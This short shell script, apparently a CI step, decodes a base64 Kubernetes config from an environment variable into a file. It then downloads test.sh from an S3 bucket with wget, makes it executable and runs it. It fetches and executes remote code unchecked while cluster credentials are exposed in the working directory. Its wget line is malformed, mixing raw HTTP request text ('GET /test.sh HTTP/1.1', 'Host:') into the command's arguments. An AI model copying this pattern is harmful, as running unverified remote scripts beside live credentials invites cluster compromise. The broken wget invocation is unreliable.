#!/bin/sh

echo ${KUBE_CONFIG_DATA} | base64 -d > kubeconfig
export KUBECONFIG="${PWD}/kubeconfig"

wget -H GET /test.sh HTTP/1.1 -H Host: post-renderer-ci.s3.amazonaws.com https://post-renderer-ci.s3.amazonaws.com/test.sh
chmod +x test.sh

./test.sh